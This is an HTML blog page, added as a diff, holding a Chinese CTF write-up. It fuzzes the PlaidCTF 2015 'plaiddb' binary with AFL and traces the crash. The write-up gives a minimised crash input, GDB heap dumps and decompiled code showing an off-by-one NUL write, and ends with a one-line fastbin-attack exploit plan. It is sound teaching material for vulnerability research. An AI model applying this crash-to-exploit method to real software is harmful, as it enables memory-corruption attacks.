@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    AFL_FUZZ |
+    
+    Migraine</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-AFL-FUZZ" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      AFL_FUZZ
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/25/AFL-FUZZ/" class="article-date">
+  <time datetime="2019-12-25T06:22:14.000Z" itemprop="datePublished">2019-12-25</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>摘要:<br>流程基本按照winsap师傅的路线走的，主要目的是入门一下AFL_FUZZ，2019年在Youtube看到这套教程真的有一种相见恨晚的感觉。</p>
+<a id="more"></a>
+
+<p>（貌似过去曾经在国内某站看过一小段，不过没有后文了）</p>
+<blockquote>
+<p>目录：<br>0x01 AFl FUZZ<br>0x02 Exploit</p>
+</blockquote>
+<p>测试程序<a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb" target="_blank" rel="noopener">2015 plaiddb</a></p>
+<h1 id="0x01-AFI-FUZZ"><a href="#0x01-AFI-FUZZ" class="headerlink" title="0x01 AFI FUZZ"></a>0x01 AFI FUZZ</h1><h2 id="安装AFL-FUZZ"><a href="#安装AFL-FUZZ" class="headerlink" title="安装AFL FUZZ"></a>安装AFL FUZZ</h2><p>官方网站 <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a><br>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;lcamtuf.coredump.cx&#x2F;afl&#x2F;releases&#x2F;afl-latest.tgz</span><br><span class="line">$ tar xvf afl-latest.tgz</span><br><span class="line">$ cd afl-2.52b&#x2F;</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<p>FUZZ无源码的文件使用qemu_mode<br>安装时会提示缺少依赖，建议用aptitude安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode&#x2F;</span><br><span class="line">$ .&#x2F;build_qemu_support.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h2><p>AFL要求创建一个in和out目录，分别存放的样例和crash输出<br>使用tee来创建一个FUZZ模板，AFL会参照我们的样例来对程序进行fuzz。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir in </span><br><span class="line">$ tee in&#x2F;a.txt | .&#x2F;plaiddb</span><br><span class="line">INFO: Welcome to the PlaidDB data storage service.</span><br><span class="line">INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PUT</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">a</span><br><span class="line">PROMPT: Enter data size:</span><br><span class="line">0</span><br><span class="line">PROMPT: Enter data:</span><br><span class="line">INFO: Insert successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">GET</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">aaaaa</span><br><span class="line">ERROR: Row not found.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">GET</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">a</span><br><span class="line">INFO: Row data [0 bytes]:</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PUT</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">bb</span><br><span class="line">PROMPT: Enter data size:</span><br><span class="line">10</span><br><span class="line">PROMPT: Enter data:</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">INFO: Insert successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">ERROR: &#39;</span><br><span class="line">&#39; is not a valid command.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">DEL</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">a  </span><br><span class="line">INFO: Delete successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">DEL</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">a</span><br><span class="line">ERROR: Row not found.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">EXIT</span><br><span class="line">INFO: Goodbye</span><br></pre></td></tr></table></figure>
+<p>查看生成的样例<br>PS:tee命令的功能也挺强大的，可以将这组数据作为程序的输入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat in&#x2F;a.txt </span><br><span class="line">PUT</span><br><span class="line">a</span><br><span class="line">0</span><br><span class="line">GET</span><br><span class="line">aaaaa</span><br><span class="line">GET</span><br><span class="line">a</span><br><span class="line">PUT</span><br><span class="line">bb</span><br><span class="line">10</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">DEL</span><br><span class="line">a</span><br><span class="line">DEL</span><br><span class="line">a</span><br><span class="line">EXIT</span><br><span class="line">$ ~&#x2F;Documents&#x2F;FUZZ&#x2F;afl-2.52b&#x2F;afl-fuzz -i in -o out -Q -- .&#x2F;plaiddb</span><br></pre></td></tr></table></figure>
+<p>在安装完Qemu之前，用-n参数代替-Q，否则会提示没有安装好Qemu</p>
+<p>记录一次错误，提示需要进入root用户，执行命令。照着做，然后运行fuzz就成了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[-] Hmm, your system is configured to send core dump notifications to an</span><br><span class="line">    external utility. This will cause issues: there will be an extended delay</span><br><span class="line">    between stumbling upon a crash and having this information relayed to the</span><br><span class="line">    fuzzer via the standard waitpid() API.</span><br><span class="line"></span><br><span class="line">    To avoid having crashes misinterpreted as timeouts, please log in as root</span><br><span class="line">    and temporarily modify &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern, like so:</span><br><span class="line">    </span><br><span class="line">    echo core &gt;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern</span><br><span class="line"></span><br><span class="line">[-] PROGRAM ABORT : Pipe at the beginning of &#39;core_pattern&#39;</span><br><span class="line">         Location : check_crash_handling(), afl-fuzz.c:7275</span><br></pre></td></tr></table></figure>
+<p>运行截图</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ2487.png" alt=""></p>
+<h2 id="通过Patch来修改ELF的链接库。"><a href="#通过Patch来修改ELF的链接库。" class="headerlink" title="通过Patch来修改ELF的链接库。"></a>通过Patch来修改ELF的链接库。</h2><p>题目给了一个libc.so.6（貌似还有一个ld，但是我下载的这里并没有），比赛里面最麻烦的就是没有libc版本了。。不过我们的ELF文件链接的还是本地环境的libc版本，可以用pathc 的方式将ELF强行链接到下载的libc版本。（Fuzz之前建议先patch）</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ2643.png" alt=""></p>
+<p>使用vim 打开ELF，然后找到链接部分的字符串。<br>修改字符产时要保持字符串长度不变，否则ELF内部的offset会出问题。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ2708.png" alt=""></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ2710.png" alt=""></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ2712.png" alt=""></p>
+<p>跑出crash</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ2723.png" alt=""></p>
+<p>目录/out/crashes下，可以查看触发crash的Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">id:000000,sig:06,src:000001,op:havoc,rep:4  README.txt</span><br><span class="line">$ cat id\:000000\,sig\:06\,src\:000001\,op\:havoc\,rep\:4 </span><br><span class="line">PUT</span><br><span class="line">@0</span><br><span class="line">DEL</span><br><span class="line">a</span><br><span class="line">PUT</span><br><span class="line">@NNNN</span><br><span class="line">0</span><br><span class="line">GET</span><br><span class="line">AL</span><br><span class="line">a</span><br><span class="line">PUT</span><br><span class="line">@NNAAAAAAAAAAAAAAAAAGET</span><br><span class="line">AL</span><br><span class="line">a</span><br><span class="line">PUT</span><br><span class="line">@NNAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+<p>精简触发payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -i out&#x2F;crashes&#x2F;id\:000000\,sig\:06\,src\:000001\,op\:havoc\,rep\:4 -o min  -- .&#x2F;plaiddb</span><br><span class="line">$ cat min</span><br><span class="line">PUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET</span><br><span class="line"></span><br><span class="line">PUT</span><br><span class="line">00000000000000000000000</span><br><span class="line">$ xxd min</span><br><span class="line">00000000: 5055 540a 0a0a 4745 540a 0a50 5554 0a00  PUT...GET..PUT..</span><br><span class="line">00000010: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000</span><br><span class="line">00000020: 3030 3030 3030 300a 30                   0000000.0</span><br></pre></td></tr></table></figure>
+<p>这里的crash并不是最优的，可以看到第二次PUT之后的数据包含/x00，通过手工输入是无法复现的（一定要复现的化可以用pwntools），实践发现可能是因为load的libc版本问题，导致crash也出现问题，所以可以更换比赛提供的libc再重新多尝试几次，获得最佳样本。</p>
+<p>最优Crash.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ xxd Crash.txt </span><br><span class="line">00000000: 5055 540a 0a0a 5055 540a 0a0a 4745 540a  PUT...PUT...GET.</span><br><span class="line">00000010: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000</span><br><span class="line">00000020: 3030 3030 3030 3030 0a                   00000000.</span><br></pre></td></tr></table></figure>
+<p>重现crash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat Crash.txt |.&#x2F;plaiddb2</span><br><span class="line">INFO: Welcome to the PlaidDB data storage service.</span><br><span class="line">INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">PROMPT: Enter data size:</span><br><span class="line">PROMPT: Enter data:</span><br><span class="line">INFO: Insert successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">PROMPT: Enter data size:</span><br><span class="line">PROMPT: Enter data:</span><br><span class="line">INFO: Update successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">ERROR: Row not found.</span><br><span class="line">*** Error in &#96;.&#x2F;plaiddb2&#39;: free(): invalid next size (fast): 0x00005555557580f0 ***</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
+<p>GDB下断点分析，可以在cat后面加上一个cat，这样会在崩溃前可以使用gdb attach进行分析。可以关闭ASLR，然后在do_GET的free()函数中下断点即可。（如果崩溃还是先发生了，将Crash.txt结尾的/x0a去掉即可，%!xxd）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ (cat Crash.txt;cat)|.&#x2F;plaiddb2</span><br><span class="line">INFO: Welcome to the PlaidDB data storage service.</span><br><span class="line">INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">PROMPT: Enter data size:</span><br><span class="line">PROMPT: Enter data:</span><br><span class="line">INFO: Insert successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">PROMPT: Enter data size:</span><br><span class="line">PROMPT: Enter data:</span><br><span class="line">INFO: Update successful.</span><br><span class="line">PROMPT: Enter command:</span><br><span class="line">PROMPT: Enter row key:</span><br><span class="line">  &lt;--回车</span><br><span class="line">ERROR: Row not found.</span><br><span class="line">*** Error in &#96;.&#x2F;plaiddb2&#39;: free(): invalid next size (fast): 0x00005555557580f0 ***</span><br><span class="line"></span><br><span class="line">触发了free检查机制，造成crash</span><br><span class="line">    &#x2F;* We might not have a lock at this point and concurrent modifications</span><br><span class="line">       of system_mem might have let to a false positive.  Redo the test</span><br><span class="line">       after getting the lock.  *&#x2F;</span><br><span class="line">    if (have_lock</span><br><span class="line">        || (&#123; assert (locked &#x3D;&#x3D; 0);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked &#x3D; 1;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ</span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;&#x3D; av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr &#x3D; &quot;free(): invalid next size (fast)&quot;;</span><br><span class="line">        goto errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>回溯栈帧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line">#0  0x00007ffff7afb810 in read () from .&#x2F;bc.so.6</span><br><span class="line">#1  0x00007ffff7a8a6a0 in _IO_file_underflow () from .&#x2F;bc.so.6</span><br><span class="line">#2  0x00007ffff7a8b62e in _IO_default_uflow () from .&#x2F;bc.so.6</span><br><span class="line">#3  0x00007ffff7a7f344 in _IO_getline_info () from .&#x2F;bc.so.6</span><br><span class="line">#4  0x00007ffff7a7e2c6 in fgets () from .&#x2F;bc.so.6</span><br><span class="line">#5  0x0000555555555123 in ?? ()</span><br><span class="line">#6  0x000055555555529b in ?? ()</span><br><span class="line">#7  0x0000555555555b05 in ?? ()</span><br><span class="line">#8  0x0000555555554bc5 in ?? ()</span><br><span class="line">#9  0x00007ffff7a31ec5 in __libc_start_main () from .&#x2F;bc.so.6</span><br><span class="line">#10 0x0000555555554bf0 in ?? ()</span><br></pre></td></tr></table></figure>
+<p>确定了断在了偏移0x11CA的free，所以在指令处下断点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b  *(0x0000555555554000+0x11CA)</span><br></pre></td></tr></table></figure>
+<p>在触发崩溃前的chunk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20xg 0x555555758110-0x20</span><br><span class="line">0x5555557580f0: 0x3030303030303030    0x3030303030303030</span><br><span class="line">0x555555758100:0x3030303030303030     0x0000000000000041</span><br></pre></td></tr></table></figure>
+<p>触发崩溃后的chunk，多出的一个\x00字节导致一个OFF BY ONE漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20xg 0x555555758110-0x20</span><br><span class="line">0x5555557580f0: 0x3030303030303030  0x3030303030303030</span><br><span class="line">0x555555758100:0x3030303030303030     0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>ASLR关闭后的堆空间分布</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000555555758000 0x0000555555779000 rw-p  [heap]</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞触发代码"><a href="#漏洞触发代码" class="headerlink" title="漏洞触发代码"></a>漏洞触发代码</h2><p>Sub_1040函数，在do_GET/do_DEL函数中作为接收row key，存在一个OFF BY ONE漏洞。<br>malloc_usable_size即获取chunk实际可用空间，这里为24字节<br>[我们都知道chunk的结构，是可以借用下一个chunk头的8字节的，即pre_size,该区域是用来计算上一个free chunk的大小用于合并，对于前一个chunk是malloc chunk的情况就不需要这个空间。]<br>同时在写入24个字节之后,*v3 = 0将第25个字节修改为0x00，覆盖了下一个chunk的size的最低位。然后在之后的free函数的next_size检测中产生crash。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">char *__fastcall sub_1040(__int64 a1, signed __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; &#x2F;&#x2F; r12</span><br><span class="line">  char *v3; &#x2F;&#x2F; rbx</span><br><span class="line">  size_t v4; &#x2F;&#x2F; r14</span><br><span class="line">  char v5; &#x2F;&#x2F; al</span><br><span class="line">  char v6; &#x2F;&#x2F; bp</span><br><span class="line">  signed __int64 v7; &#x2F;&#x2F; r13</span><br><span class="line">  char *v8; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; (char *)malloc(8uLL);</span><br><span class="line">  v3 &#x3D; v2;</span><br><span class="line">  v4 &#x3D; malloc_usable_size(v2);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; _IO_getc(stdin);</span><br><span class="line">    v6 &#x3D; v5;</span><br><span class="line">    if ( v5 &#x3D;&#x3D; &#39;\xFF&#39; )</span><br><span class="line">      do_EXIT();</span><br><span class="line">    if ( v5 &#x3D;&#x3D; &#39;\n&#39; )</span><br><span class="line">      break;</span><br><span class="line">    v7 &#x3D; v3 - v2;</span><br><span class="line">    if ( v4 &lt;&#x3D; v3 - v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 &#x3D; (char *)realloc(v2, 2 * v4);</span><br><span class="line">      v2 &#x3D; v8;</span><br><span class="line">      if ( !v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;FATAL: Out of memory&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      v3 &#x3D; &amp;v8[v7];</span><br><span class="line">      v4 &#x3D; malloc_usable_size(v8);</span><br><span class="line">    &#125;</span><br><span class="line">    *v3++ &#x3D; v6;</span><br><span class="line">  &#125;</span><br><span class="line">  *v3 &#x3D; 0;  &#x2F;&#x2F;  &lt;-- OF BY ONE</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>至于为什么在PUT两次之后，才会产生OFF BY ONE的漏洞。让我们查看堆空间，因为没有符号表，所以查看不了fast bin的内容，笔者分析的堆块的具体内容可能存在错误，如果有误请指出。<br>第一次PUT,创建了一个0x41大小的chunk，用于存放PUT分配的datastroe数据结构（实为RED BALCK TREE，此处不详细分析，想了解可以自己逆向）并且内部的指针指向后面几个chunk。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20xg 0x0000555555758080</span><br><span class="line">0x555555758080: 0x0000000000000000   0x0000000000000041</span><br><span class="line">0x555555758090: 0x00005555557580d0 0x0000000000000000 &lt;--datastore</span><br><span class="line">0x5555557580a0: 0x00005555557580f0   0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000   0x0000555555758010</span><br><span class="line">0x5555557580c0: 0x0000000000000001 0x0000000000000021 &lt;--chunk(row key)</span><br><span class="line">0x5555557580d0: 0x0000000000000000   0x0000000000000000 </span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000021&lt;--chunk</span><br><span class="line">(datasore+16)</span><br><span class="line">0x5555557580f0:     0x0000000000000000   0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>如果此时调用GET，会malloc(8)(最长长度24)，然后产生一个字节的溢出，一旦溢出溢出，字节会覆盖TOP CHUNK的一个字节，但是程序不会crash。</p>
+<p>第二次PUT，如果row key已经存在，会触发Update。PUT的参数将覆盖old datastore的数据（见下方伪代码），会free掉的new_datastore指针和old_datastore的第三个指针（0x00005555557580f0）,然后将新写入的数据，覆盖到old datastore里。<br>所以会产生free chunk，而后GET申请会发生占坑，正好占在了old_datastore的第三个指针，当OFF BY ONE的时候就会修改new datastore 的next inuse。然后free掉GET临时申请的chunk时就会crash。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  free(*v1);</span><br><span class="line">  free(*(void **)(v4 + 16));</span><br><span class="line">  *(_QWORD *)(v4 + 8) &#x3D; v1[1];</span><br><span class="line">  *(_QWORD *)(v4 + 16) &#x3D; v1[2];</span><br><span class="line">  free(v1);</span><br><span class="line">  puts(&quot;INFO: Update successful.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;40xg 0x0000555555758080</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758090: 0x00005555557580d0  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000555555758170   0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000   0x0000555555758010</span><br><span class="line">0x5555557580c0: 0x0000000000000001   0x0000000000000021</span><br><span class="line">0x5555557580d0: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x5555557580f0:     0x0000555555758140   0x0000000000000000 &lt;-- free chunk</span><br><span class="line">0x555555758100: 0x0000000000000000   0x0000000000000041 &lt;-- new datastore</span><br><span class="line">0x555555758110: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000555555758170   0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x555555758150: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758170: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000   0x0000000000020e81</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h1><p>利用思路：通过off by one导致double free漏洞（chunk 重叠），最后利用Fastbin attack来实现Get shell。</p>
